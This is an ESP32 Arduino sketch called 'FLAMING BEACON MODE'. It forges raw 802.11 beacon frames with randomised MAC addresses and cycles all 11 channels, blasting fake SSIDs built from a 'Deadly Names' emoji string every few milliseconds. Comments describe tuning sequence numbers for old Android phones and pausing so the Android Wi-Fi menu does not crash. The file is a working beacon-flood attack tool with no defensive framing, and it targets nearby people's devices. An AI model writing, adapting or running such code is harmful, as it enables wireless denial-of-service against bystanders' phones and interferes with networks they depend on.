#include <WiFi.h>
#include "esp_wifi.h"

uint16_t seq_num = 0; // The "Secret" to filling the list

uint8_t packet[128] = {
  0x80, 0x00, 0x00, 0x00,                /* Type: Beacon */
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,    /* Destination: Broadcast */
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    /* Source MAC (Randomized) */
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    /* BSSID (Randomized) */
  0x00, 0x00,                            /* Sequence Number (Index 22-23) */
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x64, 0x00, 0x01, 0x00, 
  0x00, 0x00                             /* SSID Tag Start */
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  esp_wifi_set_promiscuous(true);
  Serial.println("FLAMING BEACON MODE: ACTIVE");
}

void loop() {
  // Cycle through ALL 11 primary channels
  for (int ch = 1; ch <= 11; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    
    // Blast 5 different SSIDs per channel
    for (int i = 0; i < 5; i++) {
      
      // 1. Deadly Names - High Priority
      String names[] = {"⁶🤷⁷", "⁶🤷⁷", "⁶🤷⁷", "⁶🤷⁷", "⁶🤷⁷", "⁶🤷⁷"};
      String ssid = names[random(0, 6)] + String(random(100, 999));
      int len = ssid.length();

      // 2. Randomize Hardware ID
      for (int j = 10; j < 22; j++) packet[j] = random(256);
      packet[10] &= 0xFE;

      // 3. Update Sequence Number (CRITICAL for old Androids)
      packet[22] = (seq_num << 4) & 0xFF;
      packet[23] = (seq_num >> 4) & 0xFF;
      seq_num++;
      if (seq_num > 4095) seq_num = 0;

      // 4. Update SSID
      packet[37] = len;
      for (int j = 0; j < len; j++) packet[38 + j] = ssid[j];

      // 5. Add Tags
      int offset = 38 + len;
      packet[offset] = 0x01; packet[offset+1] = 0x01; packet[offset+2] = 0x82; // Rates
      packet[offset+3] = 0x03; packet[offset+4] = 0x01; packet[offset+5] = ch; // Channel Tag

      // 6. Fast Send
      esp_wifi_80211_tx(WIFI_IF_AP, packet, offset + 6, false);
      delay(2); 
    }
  }
  // Short breather so the Android doesn't crash the WiFi menu
  delay(100);
}
